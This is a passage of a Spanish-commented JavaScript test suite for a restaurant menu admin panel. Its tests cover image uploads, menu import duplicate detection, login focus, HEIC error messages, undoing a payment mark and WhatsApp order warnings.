		await assert.rejects(() => promesa, /No se pudo leer/);
	});

	test('y un toBlob que devuelve null tampoco deja la promesa colgada', async () => {
		const { promesa } = comprimir({ type: 'image/png' }, {}, { blobNulo: true });
		await assert.rejects(() => promesa, /No se pudo procesar/);
	});

	// ── EL NOMBRE TIENE QUE DECIR LO QUE ES ───────────────────
	// El servidor saca la extensión con la que guarda del nombre que se le
	// manda, y el archivo se sirve después con el Content-Type que sale de esa
	// extensión. Un .webp llamado .jpg llegaría al navegador anunciado como
	// JPEG: muchos lo adivinan por el contenido, y es justo la clase de cosa
	// que funciona hasta que deja de hacerlo en un dispositivo concreto.

	const subir = async blob => {
		let nombre = null;
		const ctx = cargar('index.html', [['async function uploadImg', '// ── ESCAPE CIERRA LAS VENTANAS']], {
			FormData: class { append(_c, _b, n) { if (n) nombre = n; } },
			apiFetch: async () => ({ url: 'https://panel/uploads/productos/x' }),
		});
		await ctx.uploadImg(blob);
		return nombre;
	};

	test('un blob WebP se sube con extensión .webp', async () => {
		assert.match(await subir({ type: 'image/webp' }), /\.webp$/);
	});

	test('y los de siempre siguen con la suya', async () => {
		assert.match(await subir({ type: 'image/png' }),  /\.png$/);
		assert.match(await subir({ type: 'image/jpeg' }), /\.jpg$/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('importar la carta · lo que se le enseña antes de crear nada', () => {
	// El panel no puede importar importacion.js, así que la regla de "¿esta
	// categoría ya existe?" está escrita DOS veces. Si se separan, el número
	// del botón miente: el panel dice "3 categorías nuevas" y el servidor crea
	// 2. Estas pruebas son lo único que lo impide.
	const importacion = require('../importacion.js');

	const panel = () => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]], {});

	const NOMBRES = [
		'POSTRES', 'postres', '  Póstres  ', 'Café', 'CAFE', 'Bebidas   calientes',
		'BEBIDAS CALIENTES', 'Ñoquis', 'nOqUiS', 'Patacón', '', '   ', 'Salchipapas',
	];

	test('las dos copias normalizan igual', () => {
		const { impNormalizar } = panel();
		for (const n of NOMBRES)
			assert.equal(impNormalizar(n), importacion.normalizar(n), `discrepan en "${n}"`);
	});

	// Los mismos borradores por los dos caminos: el que pinta el botón y el que
	// de verdad crea las filas.
	const CASOS = [
		{
			nombre: 'una categoría que ya existe y otra que no',
			existentes: [{ id: 'c1', nombre: 'POSTRES', orden: 2 }],
			borrador: {
				categorias: [
					{ nombre: 'Postres', platos: [{ nombre: 'FLAN', precio_numerico: 5000 }] },
					{ nombre: 'CALDOS', platos: [{ nombre: 'CALDO', precio_numerico: 8000 }] },
				],
			},
		},
		{
			nombre: 'un título repetido en dos páginas',
			existentes: [],
			borrador: {
				categorias: [
					{ nombre: 'PATACONES', platos: [{ nombre: 'A' }] },
					{ nombre: 'Patacones', platos: [{ nombre: 'B' }] },
				],
			},
		},
		{
			nombre: 'una categoría sin platos no cuenta',
			existentes: [],
			borrador: {
				categorias: [
					{ nombre: 'VACIA', platos: [] },
					{ nombre: 'CARNES', platos: [{ nombre: 'LOMO' }] },
				],
			},
		},
		{
			nombre: 'platos sueltos, sin categoría',
			existentes: [{ id: 'c9', nombre: 'Otros', orden: 1 }],
			borrador: { categorias: [{ nombre: '', platos: [{ nombre: 'SOPA' }] }] },
		},
		{
			nombre: 'platos sin nombre que no se crean',
			existentes: [],
			borrador: { categorias: [{ nombre: 'X', platos: [{ nombre: '  ' }, { nombre: 'SOPA' }] }] },
		},
		{
			nombre: 'tildes de por medio',
			existentes: [{ id: 'c2', nombre: 'Café', orden: 1 }],
			borrador: { categorias: [{ nombre: 'CAFE', platos: [{ nombre: 'TINTO' }] }] },
		},
	];

	for (const caso of CASOS) {
		test(`las cuentas cuadran con el servidor · ${caso.nombre}`, () => {
			const t = panel().impTotales(caso.borrador, caso.existentes);
			const real = importacion.planDeAplicacion(caso.borrador, caso.existentes).totales;
			assert.equal(t.nuevas, real.categorias_nuevas, 'categorías nuevas');
			assert.equal(t.existen, real.categorias_reutilizadas, 'categorías reutilizadas');
			assert.equal(t.platos, real.platos, 'platos');
		});
	}

	test('sin nada que crear, las cuentas son cero', () => {
		const { impTotales } = panel();
		for (const b of [null, undefined, {}, { categorias: [] }, { categorias: [{ nombre: 'X', platos: [] }] }])
			assert.deepEqual(JSON.stringify(impTotales(b, [])), JSON.stringify({ nuevas: 0, existen: 0, platos: 0 }));
	});
});

describe('importar la carta · lo que se manda es lo que se ve', () => {
	// impBorradorDelFormulario lee la pantalla, no una copia en memoria. Es lo
	// que hace que quitar un plato de la vista lo quite de verdad, y que una
	// corrección a mano llegue tal cual.
	function pantalla(bloques) {
		const campo = v => ({ value: v });
		const platoFalso = ([nom, desc, pre]) => ({
			querySelector: sel => ({ '.imp-p-nombre': campo(nom), '.imp-p-desc': campo(desc), '.imp-p-precio': campo(pre) }[sel]),
		});
		return {
			querySelectorAll: () => bloques.map(([nombre, platos]) => ({
				querySelector: sel => (sel === '.imp-cat-nombre' ? campo(nombre) : null),
				querySelectorAll: () => platos.map(platoFalso),
			})),
		};
	}

	const leer = bloques => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]],
		{ document: pantalla(bloques) }).impBorradorDelFormulario();

	test('recoge lo que hay en los campos', () => {
		const b = leer([['CALDOS', [['CALDO DE COSTILLA', 'CON AREPA', '$ 10.000']]]]);
		assert.equal(b.categorias[0].nombre, 'CALDOS');
		assert.equal(b.categorias[0].platos[0].nombre, 'CALDO DE COSTILLA');
		assert.equal(b.categorias[0].platos[0].descripcion, 'CON AREPA');
		assert.equal(b.categorias[0].platos[0].precio, '$ 10.000');
	});

	test('el precio va como TEXTO, igual que lo devuelve el modelo', () => {
		// Así el servidor lo normaliza con la misma regla en los dos casos, en
		// vez de tener una para lo que llega del modelo y otra para lo
		// corregido a mano.
		assert.equal(typeof leer([['X', [['SOPA', '', '12.000']]]]).categorias[0].platos[0].precio, 'string');
	});

	test('lo que se quitó de la pantalla no se manda', () => {
		const b = leer([['X', [['SOPA', '', '1000']]], ['Y', []]]);
		assert.equal(b.categorias.length, 2);
		assert.equal(b.categorias[1].platos.length, 0, 'la categoría vacía llega vacía y el servidor la descarta');
	});
});

describe('importar la carta · los platos que el restaurante ya tiene', () => {
	// Importar AÑADE y no reemplaza. Sin avisar, meterle su propia carta a un
	// restaurante que ya tiene menú se lo duplica entero — y la pantalla no
	// diría nada. Bonzas son 97 platos: 97 duplicados que deshacer a mano.
	//
	// Desde el 18/09/2026, dentro de la MISMA categoría: mirando solo el nombre,
	// el «CHICKEN» de Desgranados salía repetido del de Sándwiches.
	const panel = extra => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]],
		Object.assign({ state: { productos: [], categorias: [] } }, extra));

	const CATS = [{ id: 'ham', nombre: 'Hamburguesas' }, { id: 'san', nombre: 'Sándwiches' }, { id: 'des', nombre: 'Desgranados' }];
	const conProductos = platos => panel({ state: { categorias: CATS,
		productos: platos.map(([nombre, categoria_id]) => ({ nombre, categoria_id })) } });
	const repe = (ctx, cat, plato) => ctx.impEsRepetido(ctx.impNombresQueYaTiene(), cat, plato);

	test('reconoce el mismo plato aunque esté escrito distinto', () => {
		const ctx = conProductos([['Hamburguesa clásica', 'ham']]);
		for (const escrito of ['HAMBURGUESA CLASICA', 'hamburguesa clásica', '  Hamburguesa  Clasica '])
			assert.equal(repe(ctx, 'HAMBURGUESAS', escrito), true, escrito);
	});

	test('y no confunde dos platos distintos', () => {
		const ctx = conProductos([['Hamburguesa clásica', 'ham']]);
		assert.equal(repe(ctx, 'Hamburguesas', 'Hamburguesa doble'), false);
	});

	test('el mismo nombre en OTRA categoría no es repetido', () => {
		// El caso de Bonzas: «CHICKEN» en Sándwiches y en Desgranados son dos platos.
		const ctx = conProductos([['CHICKEN', 'san']]);
		assert.equal(repe(ctx, 'Desgranados', 'CHICKEN'), false);
		assert.equal(repe(ctx, 'SANDWICHES', 'chicken'), true, 'en la suya sí');
	});

	test('un restaurante sin platos no tiene ninguno repetido', () => {
		assert.equal(panel().impNombresQueYaTiene().size, 0);
	});

	test('un producto sin nombre no cuenta', () => {
		const ctx = panel({ state: { categorias: CATS, productos: [{ nombre: null, categoria_id: 'ham' }, { categoria_id: 'ham' }, { nombre: 'SOPA', categoria_id: 'ham' }] } });
		assert.equal(ctx.impNombresQueYaTiene().size, 1);
	});

	test('usa la MISMA regla que las categorías', () => {
		// Si comparara los platos de una forma y las categorías de otra, la
		// pantalla diría dos cosas distintas sobre el mismo texto.
		const ctx = conProductos([['Café con leche', 'ham']]);
		assert.equal(repe(ctx, 'hamburguesas', 'CAFE CON LECHE'), true);
	});
});

describe('crear un plato a mano con el nombre de otro de su categoría', () => {
	// 18/09/2026: se creaban los dos sin un aviso. Es aviso y no bloqueo: dos
	// tamaños que el restaurante distingue por la descripción son legítimos.
	const reglas = productos => cargar('platos-repetidos.js', [
		['importar.js', 'function impNormalizar', 'const IMP_SIN_CATEGORIA'],
		['platos-repetidos.js', 'function platoConElMismoNombre', 'function avisarNombreRepetido'],
	], { state: { productos } });
	const PLATOS = [{ id: 'p1', nombre: 'Arepa de queso', categoria_id: 'ent' }, { id: 'p2', nombre: 'CHICKEN', categoria_id: 'san' }];

	test('mismo nombre, misma categoría: lo encuentra', () => {
		assert.equal(reglas(PLATOS).platoConElMismoNombre('AREPA DE QUESO', 'ent', '')?.id, 'p1');
	});

	test('en otra categoría no cuenta', () => {
		assert.equal(reglas(PLATOS).platoConElMismoNombre('CHICKEN', 'des', ''), null);
	});

	test('consigo mismo no se repite al editarlo', () => {
		assert.equal(reglas(PLATOS).platoConElMismoNombre('Arepa de queso', 'ent', 'p1'), null);
	});

	test('sin nombre o sin categoría no avisa', () => {
		const ctx = reglas(PLATOS);
		assert.equal(ctx.platoConElMismoNombre('  ', 'ent', ''), null);
		assert.equal(ctx.platoConElMismoNombre('Arepa de queso', '', ''), null);
	});
});

describe('importar la carta · una categoría que se parece a otra que ya existe', () => {
	// Pasó en la primera importación real: el restaurante tenía 'Hamburguesas'
	// y el PDF decía 'HAMBURGUESA'. Se crearon las dos y la carta acabó con dos
	// secciones de lo mismo.
	const panel = () => cargar('importar.js',
		[['// ── IMPORTAR LA CARTA ─', null]],
		{ state: { productos: [], categorias: [] } });

	test('singular y plural comparten raíz', () => {
		const { impRaiz } = panel();
		for (const [a, b] of [['Hamburguesas', 'HAMBURGUESA'], ['POSTRES', 'Postre'],
			['Bebidas calientes', 'BEBIDA CALIENTE'], ['Raviol', 'Ravioles']])
			assert.equal(impRaiz(a), impRaiz(b), `${a} / ${b}`);
	});

	test('dos categorías distintas NO comparten raíz', () => {
		const { impRaiz } = panel();
		for (const [a, b] of [['CARNES', 'PESCADOS'], ['POSTRES', 'PASTAS'], ['CALDOS', 'ENSALADAS']])
			assert.notEqual(impRaiz(a), impRaiz(b), `${a} / ${b}`);
	});

	test('la raíz no se usa para juntar, solo para preguntar', () => {
		// impTotales sigue comparando por el nombre completo: 'HAMBURGUESA'
		// cuenta como nueva aunque exista 'Hamburguesas'. Juntarlas sin que
		// nadie lo vea movería platos de sitio.
		const ctx = cargar('importar.js',
			[['// ── IMPORTAR LA CARTA ─', null]],
			{ state: { productos: [], categorias: [{ id: 'c1', nombre: 'Hamburguesas' }] } });
		const t = ctx.impTotales({ categorias: [{ nombre: 'HAMBURGUESA', platos: [{ nombre: 'DOBLE' }] }] },
			[{ id: 'c1', nombre: 'Hamburguesas' }]);
		assert.equal(t.nuevas, 1);
		assert.equal(t.existen, 0);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('la miniatura de la lista de productos se pide en diferido', () => {
	// Es una línea y se cae sola en cualquier refactor de esa función, sin que
	// nada se rompa a la vista: la lista sigue pintándose igual. Lo único que
	// cambia es que una carta de 97 platos vuelve a descargar sus 61 fotos de
	// golpe, y eso no lo nota nadie desde un escritorio con fibra.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	// El trozo que va desde que se crea el <img> hasta que se cuelga del DOM.
	const bloque = src.match(/const im\s*=\s*document\.createElement\('img'\);[\s\S]{0,1200}?imgDiv\.appendChild\(im\);/);

	test('el bloque que crea la miniatura sigue existiendo', () => {
		// Si esto falla, la función se reescribió y las dos comprobaciones de
		// abajo estarían midiendo el vacío en vez de la miniatura.
		assert.ok(bloque, 'no se encontró dónde se crea la miniatura del producto');
	});

	test('lleva loading="lazy"', () => {
		assert.match(bloque[0], /\bim\.loading\s*=\s*'lazy'/,
			'la miniatura tiene que pedirse en diferido');
	});

	test('y se pone ANTES del src', () => {
		// Después del src no sirve de nada: el navegador ya arrancó la descarga
		// y el atributo llega tarde. Es el error fácil de cometer al reordenar.
		const posLoading = bloque[0].indexOf('im.loading');
		const posSrc     = bloque[0].indexOf('im.src');
		assert.ok(posLoading >= 0 && posSrc >= 0);
		assert.ok(posLoading < posSrc,
			'loading se asigna después del src, así que no surte efecto');
	});
});


// ═══════════════════════════════════════════════════════════════
describe('el login recibe el foco al llegar a él', () => {
	// Hay DOS caminos que acaban en el login y arreglar uno solo deja el otro
	// roto, así que se prueban por separado.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('el arranque sin sesión lo enfoca', () => {
		const arranque = src.match(/\} else \{[^}]*loginScreen'\)\.style\.display='flex';[^}]*\}/);
		assert.ok(arranque, 'no se encontró la rama de arranque que enseña el login');
		assert.match(arranque[0], /enfocarLogin\(\)/,
			'al arrancar sin sesión el foco no llega al identificador');
	});

	test('y salir devuelve el foco al campo', () => {
		// logout() no recarga la página: esconde unas pantallas y enseña otra.
		// Sin esto, salir para entrar como otro restaurante deja el foco en
		// ninguna parte y hay que ir al campo con el ratón.
		const cuerpo = src.match(/function logout\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo, 'no se encontró logout()');
		assert.match(cuerpo[0], /enfocarLogin\(\)/,
			'logout() no devuelve el foco al identificador');
	});

	test('no se usa el atributo autofocus', () => {
		// Sería lo obvio y está descartado a propósito: dispara al cargar la
		// página, y ahí todavía no se sabe si el login es el destino. Con
		// sesión guardada el arranque enseña el panel, y el foco habría
		// quedado en un campo ya invisible.
		const campo = src.match(/<input[^>]*id="slugInput"[\s\S]*?>/);
		assert.ok(campo, 'no se encontró el campo del identificador');
		assert.doesNotMatch(campo[0], /\bautofocus\b/,
			'el foco se pone desde los dos puntos de entrada, no con el atributo');
	});

	// ── Olvidar el PIN (L1) ─────────────────────────────────────
	test('el gestor de contraseñas puede guardar y ofrecer el acceso', () => {
		// El cliente entra cada varias semanas. Con autocomplete="off" el
		// navegador no guardaba el identificador, y sin declarar nada en el PIN
		// no siempre lo emparejaba con él.
		const slug = src.match(/<input[^>]*id="slugInput"[\s\S]*?>/);
		const pin = src.match(/<input[^>]*id="pinInput"[\s\S]*?>/);
		assert.match(slug[0], /autocomplete="username"/);
		assert.match(pin[0], /autocomplete="current-password"/);
	});

	test('el login dice a quién pedir un PIN olvidado', () => {
		const pista = src.match(/<div class="login-hint">[\s\S]*?<\/div>/);
		assert.ok(pista, 'no se encontró la línea bajo el botón');
		assert.match(pista[0], /Olvidaste tu PIN/);
		const enlace = pista[0].match(/href="([^"]+)"/);
		assert.ok(enlace, 'la línea no enlaza a ningún sitio');
		// El mismo número que la landing. Con el prefijo del país: sin él,
		// wa.me no abre ningún chat.
		assert.match(enlace[1], /^https:\/\/wa\.me\/573151182283\b/);
		assert.match(pista[0], /rel="noopener"/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('una foto HEIC que el navegador no abre dice qué hacer', () => {
	// Probado a mano el 10/09/2026 con una foto de iPhone sin convertir: salía el
	// mismo mensaje que para un PDF renombrado, que no dice qué pasa ni cómo
	// arreglarlo. Ver SU1 en docs/revision-ux.md.
	const f = () => cargar('index.html', 'function esHeic', 'function compressImage',
		{ String, RegExp });
	const archivo = (name, type = '') => ({ name, type });

	test('.heic con el tipo vacío, que es lo que llega en Windows', () => {
		// El sistema no tiene registrado HEIC, así que el navegador deja el tipo
		// en blanco. Si solo se mirara el tipo, este caso —el de quien pasó la
		// foto al computador— se quedaría con el mensaje genérico.
		assert.equal(f().esHeic(archivo('IMG_4021.heic', '')), true);
	});

	test('el tipo image/heic, aunque el nombre no lo diga', () => {
		assert.equal(f().esHeic(archivo('foto', 'image/heic')), true);
		assert.equal(f().esHeic(archivo('foto', 'image/heif-sequence')), true);
	});

	test('sin distinguir mayúsculas, que es como las nombra el iPhone', () => {
		assert.equal(f().esHeic(archivo('IMG_4021.HEIC')), true);
		assert.equal(f().esHeic(archivo('captura.HEIF')), true);
	});

	test('un JPEG normal no es HEIC', () => {
		assert.equal(f().esHeic(archivo('plato.jpg', 'image/jpeg')), false);
	});

	test('que "heic" aparezca en el nombre no basta: tiene que ser la extensión', () => {
		// Un includes('heic') a secas lo confundiría, y le daría las instrucciones
		// del iPhone a quien subió un JPEG corrupto con un nombre desafortunado.
		assert.equal(f().esHeic(archivo('heic-receta-final.jpg', 'image/jpeg')), false);
	});

	test('el mensaje del HEIC nombra el formato y dice qué hacer', () => {
		// Que no se «simplifique» de vuelta a algo que no ayuda: tiene que decir
		// qué es y dar una salida.
		const m = f().mensajeImagenIlegible(archivo('IMG_4021.heic'));
		assert.match(m, /HEIC/);
		assert.match(m, /Fotos/, 'falta la instrucción que lo resuelve en el iPhone');
		assert.match(m, /JPG/, 'falta la salida para quien no sube desde el iPhone');
	});

	test('lo que no es HEIC conserva el mensaje de siempre', () => {
		// Es el texto del caso del PDF renombrado, verificado en producción el
		// 10/09/2026. Para ese caso es el mensaje justo y no se toca.
		assert.equal(f().mensajeImagenIlegible(archivo('documento.jpg', 'image/jpeg')),
			'Ese archivo no es una imagen que el navegador pueda abrir');
	});

	test('compressImage usa este mensaje cuando la imagen no decodifica', () => {
		// Las funciones pueden estar perfectas y no servir de nada si el
		// onerror vuelve a escribir el texto a mano.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function compressImage\([\s\S]*?\n\}/);
		assert.ok(cuerpo, 'no se encontró compressImage');
		assert.match(cuerpo[0], /img\.onerror\s*=\s*\(\)\s*=>\s*rej\(new Error\(mensajeImagenIlegible\(file\)\)\)/,
			'el onerror ya no pasa por mensajeImagenIlegible');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('«✓ Pagó» se puede deshacer', () => {
	// S1 en docs/revision-ux.md: un clic mal dado marcaba a un cliente como
	// pagado, borraba el aviso de «Vencido» y no había forma de volver atrás
	// desde el panel. Arreglarlo era SQL contra producción.

	// ── Un DOM mínimo, con className y classList sincronizados ─────
	function nodo() {
		const n = {
			children: [], type: '', onclick: null, _cls: new Set(), _texto: '',
			get className() { return [...this._cls].join(' '); },
			set className(v) { this._cls = new Set(String(v).split(/\s+/).filter(Boolean)); },
			get textContent() { return this._texto ?? this.children.map(c => c.textContent).join(''); },
			set textContent(v) { this._texto = String(v); this.children = []; },
			appendChild(c) { this._texto = undefined; this.children.push(c); return c; },
		};
		n.classList = {
			add: (...c) => c.forEach(x => n._cls.add(x)),
			remove: (...c) => c.forEach(x => n._cls.delete(x)),
			contains: c => n._cls.has(c),
		};
		return n;
	}

	function montarToast() {
		const toast = nodo();
		const reloj = { pendiente: null };
		const ctx = cargar('comun.js', 'let toastTimer=null;', null, {
			document: { getElementById: () => toast, createElement: () => nodo() },
			setTimeout: (fn, ms) => { reloj.pendiente = { fn, ms }; return 1; },
			clearTimeout: () => { reloj.pendiente = null; },
			String,
		});
		const boton = () => toast.children.find(c => c.className === 'toast-accion');
		return { ctx, toast, reloj, boton };
	}

	test('sin acción, el toast se comporta como siempre', () => {
		// Lo usan decenas de sitios del panel. No puede cambiar para ninguno.
		const { ctx, toast, reloj, boton } = montarToast();
		ctx.showToast('Guardado', 'success');
		assert.equal(toast.textContent, 'Guardado');
		assert.equal(toast.classList.contains('con-accion'), false);
		assert.equal(boton(), undefined);
		assert.equal(reloj.pendiente.ms, 3000);
	});

	test('con acción, lleva el botón y se puede pulsar', () => {
		const { ctx, toast, boton } = montarToast();
		let pulsado = false;
		ctx.showToast('Bonzas: pago registrado', 'success',
			{ texto: 'Deshacer', alPulsar: () => { pulsado = true; } });
		assert.ok(boton(), 'no se pintó el botón');
		assert.equal(boton().textContent, 'Deshacer');
		// Sin esta clase hereda pointer-events:none y el botón no recibe el clic.
		assert.equal(toast.classList.contains('con-accion'), true);
		boton().onclick();
		assert.equal(pulsado, true);
		assert.equal(toast.classList.contains('show'), false, 'el toast no se escondió al pulsar');
	});

	test('dura más que los 3 s de siempre, para dar tiempo a reaccionar', () => {
		const { ctx, reloj } = montarToast();
		ctx.showToast('x', 'success', { texto: 'Deshacer', alPulsar: () => {} });
		assert.ok(reloj.pendiente.ms > 3000);
	});

	test('al caducar no deja un toast invisible bloqueando clics', () => {
		// El caso delicado. Si al esconderse conservara 'con-accion', quedaría
		// transparente pero con pointer-events:auto, tapando la esquina donde
		// suele estar el botón de Guardar.
		const { ctx, toast, reloj } = montarToast();
		ctx.showToast('x', 'success', { texto: 'Deshacer', alPulsar: () => {} });
		reloj.pendiente.fn();
		assert.equal(toast.classList.contains('show'), false);
		assert.equal(toast.classList.contains('con-accion'), false,
			'el toast escondido sigue recibiendo clics');
	});

	test('un toast normal después reemplaza al que tenía botón', () => {
		const { ctx, toast, boton } = montarToast();
		ctx.showToast('x', 'success', { texto: 'Deshacer', alPulsar: () => {} });
		ctx.showToast('Otra cosa', 'info');
		assert.equal(boton(), undefined, 'el botón viejo sigue ahí');
		assert.equal(toast.classList.contains('con-accion'), false);
	});

	// ── Marcar y deshacer ───────────────────────────────────────
	function montarPago(factura, apiFetch) {
		const peticiones = [];
		const toasts = [];
		const ctx = cargar('index.html', 'async function marcarComoPagado', 'async function eliminarRestaurante', {
			facturacionDe: () => factura,
			apiFetch: apiFetch || (async (metodo, ruta, cuerpo) => { peticiones.push({ metodo, ruta, cuerpo }); return {}; }),
			cargarListaRestos: async () => {},
			showToast: (msg, tipo, accion) => toasts.push({ msg, tipo, accion }),
			Date, String,
		});
		return { ctx, peticiones, toasts };
	}
	const tanda = () => new Promise(r => setImmediate(r));

	test('deshacer restaura la fecha de pago que había antes', async () => {
		const { ctx, peticiones, toasts } = montarPago({ ultimo_pago: '2026-08-01' });
		await ctx.marcarComoPagado('r1', 'Bonzas');
		assert.match(peticiones[0].cuerpo.ultimo_pago, /^\d{4}-\d{2}-\d{2}$/);
		toasts[0].accion.alPulsar();
		await tanda();
		assert.equal(peticiones[1].cuerpo.ultimo_pago, '2026-08-01');
	});

	test('y si no había ningún pago, lo devuelve a null, no a una fecha', async () => {
		// El caso fácil de equivocar: un restaurante que nunca pagó. Deshacer
		// tiene que dejarlo sin fecha, que es lo que lo pinta como «Vencido».
		const { ctx, peticiones, toasts } = montarPago(null);
		await ctx.marcarComoPagado('r1', 'Bonzas');
		toasts[0].accion.alPulsar();
		await tanda();
		assert.ok('ultimo_pago' in peticiones[1].cuerpo, 'no se mandó la clave');
		assert.equal(peticiones[1].cuerpo.ultimo_pago, null);
	});

	test('el toast nombra el restaurante', async () => {
		// El error típico es la fila equivocada; el nombre es lo que lo delata.
		const { ctx, toasts } = montarPago(null);
		await ctx.marcarComoPagado('r1', 'Bonzas Burger Grill');
		assert.match(toasts[0].msg, /Bonzas Burger Grill/);
		assert.equal(toasts[0].accion.texto, 'Deshacer');
	});

	test('si deshacer falla, dice que el pago sigue registrado', async () => {
		// Un «error» a secas dejaría creer que se deshizo.
		const { ctx, toasts } = montarPago(null, async () => { throw new Error('red'); });
		await ctx.deshacerPago('r1', 'Bonzas', null);
		assert.equal(toasts[0].tipo, 'error');
		assert.match(toasts[0].msg, /sigue marcado como pagado/);
	});

	// ── La ficha enseña cuándo se pagó ──────────────────────────
	const ficha = () => cargar('index.html',
		[['function diaDelMesClamped', '// Recibe la fila de facturación'],
		 ['function estadoPagoHtml', '// ── MARCAR COMO PAGADO']],
		{ Date, Math, String });
	const hoyISO = () => {
		const d = new Date();
		return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
	};

	test('un restaurante al día enseña la fecha de su último pago', () => {
		// Así un pago marcado por error sigue a la vista cuando ya caducó el
		// «Deshacer», en vez de ser una etiqueta verde igual a un pago de verdad.
		const html = ficha().estadoPagoHtml({ dia_pago: 1, ultimo_pago: hoyISO() });
		assert.match(html, /pagó el/);
	});

	test('uno vencido y sin ningún pago no revienta', () => {
		// La fecha del pago se calcula después de la rama de «vencido» a
		// propósito: ahí puede no haber pago, y formatear null lanzaría.
		assert.doesNotThrow(() => ficha().estadoPagoHtml({ dia_pago: 1, ultimo_pago: null }));
		assert.match(ficha().estadoPagoHtml({ dia_pago: 1, ultimo_pago: null }), /Vencido/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('una carta con carrito y sin WhatsApp se ve desde el panel', () => {
	// PE1 en docs/revision-ux.md. El estado roto no nace de borrar el número
	// —savePedidos() no deja guardarlo vacío— sino de no ponerlo nunca al pasar
	// un restaurante a un modelo con carrito. Así estaba A Ojo Cerrado.
	const reglas = [['const MODELO_POR_DEFECTO', '// En qué proporción se recorta el video']];
	const regla = () => cargar('index.html', reglas, { String });
	const aviso = () => cargar('index.html',
		[...reglas, ['function avisoPedidosHtml', 'function fichaPlanHtml']],
		{ String, planDe: r => r._plan || {} });

	const CON_CARRITO = { carrito: true };

	test('el modelo Carrito, retirado, ya no tiene carrito por su cuenta', () => {
		// Lo llevaba siempre encendido hasta el 17/09/2026.
		assert.equal(regla().cartaTieneCarrito({ nav: 'carrito' }, CON_CARRITO), false);
	});

	test('Video y Vertical, solo con plan e interruptor', () => {
		const r = regla();
		assert.equal(r.cartaTieneCarrito({ nav: 'video', carrito: true }, CON_CARRITO), true);
		assert.equal(r.cartaTieneCarrito({ nav: 'vertical', carrito: false }, CON_CARRITO), false);
		assert.equal(r.cartaTieneCarrito({ nav: 'video', carrito: true }, {}), false);
	});

	test('Explorar, desde vmenus-app#33, como los demás: con plan e interruptor', () => {
		const r = regla();
		assert.equal(r.cartaTieneCarrito({ nav: 'explorar', carrito: true }, CON_CARRITO), true);
		assert.equal(r.cartaTieneCarrito({ nav: 'explorar', carrito: false }, CON_CARRITO), false, 'sin interruptor');
		assert.equal(r.cartaTieneCarrito({ nav: 'explorar', carrito: true }, {}), false, 'sin plan');
	});

	test('un modelo que la carta no conoce no tiene carrito', () => {
		// Lo que justificaba esta regla sigue valiendo: avisar de que no recibe
		// pedidos a una carta que no deja armarlos sería una falsa alarma.
		assert.equal(regla().cartaTieneCarrito({ nav: 'modelo-futuro', carrito: true }, CON_CARRITO), false);
	});

	test('Topnav y Sidebar, como Video: con plan e interruptor (vmenus-app#28)', () => {
		const r = regla();
		for (const nav of ['topnav', 'sidebar']) {
			assert.equal(r.cartaTieneCarrito({ nav, carrito: true }, CON_CARRITO), true, nav);
			assert.equal(r.cartaTieneCarrito({ nav, carrito: false }, CON_CARRITO), false, `${nav} sin interruptor`);
			assert.equal(r.cartaTieneCarrito({ nav, carrito: true }, {}), false, `${nav} sin plan`);
		}
	});

	test('sin modelo elegido cuenta como el modelo por defecto, Topnav', () => {
		assert.equal(regla().cartaTieneCarrito({ carrito: true }, CON_CARRITO), true);
		assert.equal(regla().cartaTieneCarrito({}, CON_CARRITO), false);
	});

	test('recibePedidos limpia el número igual que la carta', () => {
		const r = regla();
		assert.equal(r.recibePedidos({ whatsapp_pedidos: '+57 300 123 4567' }), true);
		assert.equal(r.recibePedidos({ whatsapp_pedidos: '  - + ' }), false);
		assert.equal(r.recibePedidos({}), false);
	});

	test('la lista marca a quien tiene carrito y no tiene número', () => {
		const html = aviso().avisoPedidosHtml({ atributos: { nav: 'sidebar', carrito: true }, _plan: CON_CARRITO });
		assert.match(html, /no recibe pedidos/);
		assert.match(html, /resto-etiqueta mal/);
	});

	test('y no marca a quien ya tiene número', () => {
		assert.equal(aviso().avisoPedidosHtml({ atributos: { nav: 'sidebar', carrito: true, whatsapp_pedidos: '573001234567' }, _plan: CON_CARRITO }), '');
	});

	test('a un Explorar con el carrito encendido y sin número, también (vmenus-app#33)', () => {
		assert.notEqual(aviso().avisoPedidosHtml({ atributos: { nav: 'explorar', carrito: true }, _plan: CON_CARRITO }), '');
		assert.equal(aviso().avisoPedidosHtml({ atributos: { nav: 'explorar', carrito: false }, _plan: CON_CARRITO }), '', 'apagado no avisa');
	});

	test('a un Topnav con el carrito encendido y sin número, sí', () => {
		// Desde vmenus-app#28 su carta deja armar el pedido: sin número, no enviarlo.
		assert.notEqual(aviso().avisoPedidosHtml({ atributos: { nav: 'topnav', carrito: true }, _plan: CON_CARRITO }), '');
	});

	test('el aviso rojo de la tarjeta se enciende y se apaga con el número', () => {
		const caja = { style: {} };
		const estado = { restaurante: { atributos: { nav: 'sidebar', carrito: true } } };
		const ctx = cargar('index.html',
			[...reglas, ['pedidos.js', 'function actualizarAvisoPedidos', '// ── MÉTODOS DE PAGO']],
			{ String, state: estado, planActual: () => ({ carrito: true }), document: { getElementById: () => caja } });
		ctx.actualizarAvisoPedidos();
		assert.equal(caja.style.display, 'block', 'sin número el aviso no se enseña');
		estado.restaurante.atributos.whatsapp_pedidos = '573001234567';
		ctx.actualizarAvisoPedidos();
		assert.equal(caja.style.display, 'none', 'con número el aviso sigue a la vista');
	});

	test('guardar el número vuelve a evaluar el aviso', () => {
		// Si no, se guarda el número y el aviso rojo sigue ahí hasta recargar.
		// Desde el 16/09/2026 el camino es otro —lo guarda Ajustes y repinta—
		// pero tiene que acabar en la misma llamada.
		const ajustes = fs.readFileSync(path.join(PUBLIC, 'ajustes.js'), 'utf8');
